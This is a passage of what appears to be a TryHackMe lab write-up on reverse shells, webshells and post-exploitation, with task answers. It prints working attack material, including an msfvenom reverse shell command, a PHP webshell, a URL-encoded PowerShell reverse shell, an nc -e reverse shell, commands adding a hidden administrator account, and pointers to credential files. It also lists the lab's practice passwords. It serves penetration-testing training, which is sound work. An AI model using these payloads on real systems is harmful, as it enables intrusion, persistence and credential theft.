>> <code><strong>msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443</strong></code><br>
<p><br></p>

<h2>Task 10 - Metasploit multi/handler</h2>
<br>

<p>Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.<br>
Fortunately, it's relatively easy to use:</p>

<ol type="1. ">
  <li>Open Metasploit with <code>msfconsole</code>code></li>
  <li>Type <code>use multi/handler</code>code>, and press enter</li>
</ol></p>

<p>We are now primed to start a multi/handler session. Let's take a look at the available options using the <code>options</code> command:</p>

Fortunately, it's relatively easy to use:</p>

![image](https://github.com/user-attachments/assets/013e5120-2c3e-45de-a51d-e317cac45509)

<p>There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your tun0 address). We set these options with the following commands:</p>

<ul style="list-style-type:square">
    <li><code>set PAYLOAD <payload></code>code></li>
    <li><code>set LHOST <listen-address></code>code></li>
    <li><code>set LPORT <listen-port></code>code></li>
</ul></p>

<p>We should now be ready to start the listener!<br>

Let's do this by using the exploit <code>-j command</code>. This tells Metasploit to launch the module, running as a job in the background.</p>

![image](https://github.com/user-attachments/assets/a918e4d3-7834-4222-9f82-02c6b251c9ae)

<p>Notice that, because the multi/handler was originally backgrounded, we needed to use <code>sessions 1</code> to foreground it again. This worked as it was the only session running. Had there been other <code>sessions</code>code> active, we would have needed to use sessions to see all active sessions, then use <code>sessions <number></number>code> to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see <em>"Command Shell session 1 opened"</em>).</p>

> 10.1 - <em>What command can be used to start a listener in the background?</em><br>
>> <code><strong>exploit -j</strong></code><br>
<p><br></p>

> 10.2 - <em>If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?</em><br>
>> <code><strong>session 10</strong></code><br>
<p><br></p>

<h2>Task 11 - WebShells</h2>
<br>

<p>There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell. See the Upload Vulnerabilities Room for a more extensive look at this concept.<br>

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.<br>

As PHP is still the most common server side scripting language, let's have a look at some simple code for this.<br>

In a very basic one line format:<br>

<code><?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?></code><br>

This will take a GET parameter in the URL and execute it on the system with <code>shell_exec()</code>. Essentially, what this means is that any commands we enter in the URL after <code>?cmd=</code> will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.<br>

Let's see this in action:</p>

![image](https://github.com/user-attachments/assets/126e50d7-33ee-4e58-a4d1-5fe797af511d)

<p>Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box. In other words, by entering the <code>ifconfig</code> command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. <code>whoami</code>, <code>hostname</code>, <code>arch</code>, etc).<br>

As mentioned previously, there are a variety of webshells available on Kali by default at <code>/usr/share/webshells</code> -- including the infamous <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)">PentestMonkey php-reverse-shell</a> -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.<br>

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the <code>cmd</code> argument:</p>

<pre><code>powershell%20-c%20%22%24client%20%3D%20New-	Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-
TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-		String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22 
</code></pre>

<p>This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.</p>

<h2>Task 12 - Next Steps</h2>
<p></p>

<strong>Ok, we have a shell. Now what? </strong>

<br>

<p>We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?<br>

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at <code>/home/<user>/.ssh</code> are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like <a href="https://tryhackme.com/r/room/introtoshells](https://dirtycow.ninja/)">Dirty C0w</a> or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.<br>



On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at <code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code>
 or <code>C:\xampp\FileZilla Server\FileZilla Server.xml</code><br>
. These can be MD5 hashes or in plaintext, depending on the version.<br>

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.<br>

The syntax for this is as follows:<br>
<code>net user <username> <password> /add</code><br>
<code>net localgroup administrators <username> /add</code><br>

<br>
<br>

<p><strong>The important take away from this task:</strong></p>
<p>Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.</p>

<h2>Task 13 - Practice and Examples</h2>
<br>

<p>This room contained a lot of information, and gave you little opportunity to put it into practice throughout. The following two tasks contain virtual machines (one Ubuntu 18.04 server and one Windows server), each configured with a simple webserver with which you can upload and activate shells. This is a sandbox environment, so there will be no filters to bypass. Login credentials and instructions for each will also be given, should you wish to log in to practice with netcat, socat or meterpreter shells.<br>

The remainder of this task will consist of shell examples for you to try out on the practice boxes.</p>

> 13.1 - <em>Try uploading a webshell to the Linux box, then use the command: <code>nc <LOCAL-IP> <PORT> -e /bin/bash</code> to send a reverse shell back to a waiting listener on your own machine.</em><br>

<p><br></p>

> 13.2 - <em>Navigate to <code>/usr/share/webshells/php/php-reverse-shell.php</code> in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.3 - <em>Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.</em><br>

>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<h2>Task 14 - Linux Practice Box</h2>
<br>

<p>The box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:</p>

<ul style="list-style-type:square">
    <li><code>Username</code>: shell</li>
    <li><code>Password</code>: TryH4ckM3!</li>
</ul></p>

> 14.1 - <em>No answer required</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<h2>Task 15 - Windows Practice Box</h2>
<br>

<p>This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:</p>

<ul style="list-style-type:square">
    <li><code>Username</code>: Administrator</li>
    <li><code>Password</code>: TryH4ckM3!</li>
</ul></p>

<p>To login using RDP:</p>
<p><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.205.224 /u:Administrator /p:'TryH4ckM3!'</code></p>
